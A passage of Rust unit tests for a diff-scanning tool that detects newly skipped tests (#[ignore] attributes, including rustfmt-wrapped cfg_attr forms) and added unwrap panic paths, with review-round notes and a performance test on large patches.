    /// independent review, IR10-M-1: `ignparen.patch`, a real `git diff`; rustc 1.99.1, two
    /// tests ignored). As an attribute of its own in a `cfg_attr` list it does the same. And
    /// the bare `ignore` that an ordinary `git diff -U0` of rustfmt output ends a hunk on
    /// (`cfgu0.patch`: rustfmt writes a long condition over lines and `ignore` alone above
    /// `)]`) is not read: it can go on as `ignore::case`, and a hunk side is read as text that
    /// ends there. That one is an ordinary declared miss (the coordinator's ruling of round
    /// 17, kept in round 18). Since round 19 a skip is read only where the side holds its
    /// attribute whole (but for a seventeenth nested `cfg_attr` list, taken to hold one), and
    /// the same layout with a reason, `ignore = "…"` alone above `)]`, is the same ordinary miss
    /// (rounds 13 to 18 read it). Neither is `-U0` only: wherever a hunk ends between the
    /// `ignore` and the `)]`, at any context width, the skip is not read (the twelfth
    /// independent review's `four-u3.patch`, plain `git diff`, IR12-L-1).
    #[test]
    fn an_ignore_with_arguments_is_a_skip_and_a_bare_ignore_at_the_end_is_not() {
        let file = unplaced(
            "--- a/tests/it.rs\n+++ b/tests/it.rs\n@@ -1,9 +1,11 @@\n #[test]\n+#[ignore(not_ready)]\n fn a() {\n     assert_eq!(1 + 1, 2);\n }\n \n #[test]\n+#[cfg_attr(all(), ignore(flaky))]\n fn d() {\n     assert_eq!(2 + 2, 4);\n }\n",
        )
        .remove(0);
        assert_eq!(
            found(&file),
            [
                (S::TestSkipped, Basis::Lexical, 2),
                (S::TestSkipped, Basis::Lexical, 8)
            ]
        );
        let cfgu0 = unplaced(
            "--- a/tests/slow.rs\n+++ b/tests/slow.rs\n@@ -2,2 +2,8 @@\n-#[should_panic(\n-    expected = \"a very long expected panic message that makes rustfmt wrap the attribute over lines\"\n+#[cfg_attr(\n+    any(\n+        target_os = \"windows\",\n+        target_os = \"macos\",\n+        target_arch = \"wasm32\",\n+        target_env = \"musl\"\n+    ),\n+    ignore\n",
        )
        .remove(0);
        assert_eq!(found(&cfgu0), []);
        // Vesper, round 18 (VD3R18-M-1, `direct.rs` and `cfg.rs`, as `git diff -U0` wrote
        // them): in `discard! { … }` the attribute's opening parenthesis goes on as
        // `NOT_A_SKIP` and `)]`; it compiles and skips nothing
        for line in ["#[ignore(", "#[cfg_attr(all(), ignore("] {
            let honest = unplaced(&format!(
                "--- a/tests/d.rs\n+++ b/tests/d.rs\n@@ -5 +5 @@ fn main() {{\n-        #[allow(\n+        {line}\n"
            ))
            .remove(0);
            assert_eq!(found(&honest), [], "{line}");
        }
        let reason = unplaced(
            "--- a/tests/slow.rs\n+++ b/tests/slow.rs\n@@ -2,2 +2,8 @@\n-#[should_panic(\n-    expected = \"a very long expected panic message that makes rustfmt wrap the attribute over lines\"\n+#[cfg_attr(\n+    any(\n+        target_os = \"windows\",\n+        target_os = \"macos\",\n+        target_arch = \"wasm32\",\n+        target_env = \"musl\"\n+    ),\n+    ignore = \"slow on these platforms\"\n",
        )
        .remove(0);
        assert_eq!(found(&reason), []);
        // with the `)]` in the hunk it is whole, and a skip
        let reason = unplaced(
            "--- a/tests/slow.rs\n+++ b/tests/slow.rs\n@@ -1,4 +1,10 @@\n #[test]\n-#[should_panic(\n-    expected = \"a very long expected panic message that makes rustfmt wrap the attribute over lines\"\n+#[cfg_attr(\n+    any(\n+        target_os = \"windows\",\n+        target_os = \"macos\",\n+        target_arch = \"wasm32\",\n+        target_env = \"musl\"\n+    ),\n+    ignore = \"slow on these platforms\"\n )]\n",
        )
        .remove(0);
        assert_eq!(found(&reason), [(S::TestSkipped, Basis::Hunk, 2)]);
    }

    /// A second section for the same path (seventh independent review, IR7-H-2). Plain
    /// `git apply` 2.56.0 applies both sections to the one file ("Checking patch src/n.rs..."
    /// twice, rc 0), the result is the call `opt.unwrap\n();` and rustc compiles it.
    ///
    /// This test pinned the answer of the branch before it stood on release 0.8.4, and said
    /// that after the rebase `parse` must refuse this patch. It does not: the parser of 0.8.4
    /// refuses one path in several sections except where Git applies them one after the
    /// other, and a change in place after a section that wrote the path is such an exception
    /// (measured at integration, 2026-11-17: the 0.8.4 binary ranks this patch as two files).
    /// Since 2026-11-18 such sections are also read as one file in the patch's reading
    /// ([`CarriedShares`]), and the call is found on the first section, where its line is.
    ///
    /// Each section read alone, as the only file of its patch (`file_evidence`), still has
    /// nothing: the first section ends on `.unwrap`, which is
    /// no evidence by itself (a field can have that name), and the second begins with `();`.
    /// (Round 15 reported the call at the end of the first section; that reading also made
    /// a spawn of a return type named `Command`, and is gone. A rename of a file the patch
    /// creates, followed by a change to the new name, is not another way to this: plain Git
    /// refuses it, "src/n.rs: No such file or directory".)
    #[test]
    fn a_second_section_for_one_path_is_two_files_until_the_parser_refuses_it() {
        let files = unplaced(
            "diff --git a/src/n.rs b/src/n.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/n.rs\n@@ -0,0 +1,2 @@\n+pub fn f(opt: Option<u32>) -> u32 {\n+    let v = opt.unwrap\ndiff --git a/src/n.rs b/src/n.rs\n--- a/src/n.rs\n+++ b/src/n.rs\n@@ -9,0 +3,3 @@\n+    ();\n+    v\n+}\n",
        );
        assert_eq!(files.len(), 2);
        assert_eq!(
            (files[0].path.as_str(), files[1].path.as_str()),
            ("src/n.rs", "src/n.rs")
        );
        assert_eq!(found(&files[0]), []);
        assert_eq!(found(&files[1]), []);
        // In the patch, the two sections are also one file.
        let shares = CarriedShares::of(&files);
        let (first, _) = file_evidence_marked(&files[0], shares.share(0));
        let first: Vec<_> = first.iter().map(|e| (e.signal, e.side, e.line)).collect();
        assert_eq!(first, [(S::PanicPathAdded, Side::New, 2)]);
        assert_eq!(file_evidence_marked(&files[1], shares.share(1)).0, []);
    }

    /// The texts of a file are found in a time that goes with the number of its hunks. A
    /// patch that is all pairs of touching hunks has a run for each pair, and each run that a
    /// number makes is looked for among the runs already made: with a search of all of them
    /// (as this round first had it) 165,000 pairs did not finish in two minutes, where the
    /// round before took three seconds. A run is looked for among the runs that begin with
    /// its first hunk, five at most.
    #[test]
    fn the_texts_of_a_file_of_pairs_cost_what_it_is_long() {
        const PAIRS: usize = 60_000;
        let spent = within_deadline(|| {
            let mut patch = String::from("--- a/src/big.rs\n+++ b/src/big.rs\n");
            for pair in 0..PAIRS {
                let (old, new) = (10 + 20 * pair, 10 + 22 * pair);
                let _ = write!(
                    patch,
                    "@@ -{old},1 +{new},2 @@\n ctx\n+a();\n@@ -{},1 +{},2 @@\n ctx\n+b();\n",
                    old + 1,
                    new + 2
                );
            }
            let file = unplaced(&patch).remove(0);
            let start = ScanClock::start();
            let texts = texts(&file);
            let spent = start.elapsed();
            // every hunk alone, and one run for each pair
            assert_eq!(texts.len(), 3 * PAIRS);
            assert_eq!(texts[2 * PAIRS].hunks, [0, 1]);
            spent
        });
        // A debug build takes a few tenths of a second; the search of every run took minutes.
        assert!(spent < COST_BOUND, "{spent:?}");
    }
}
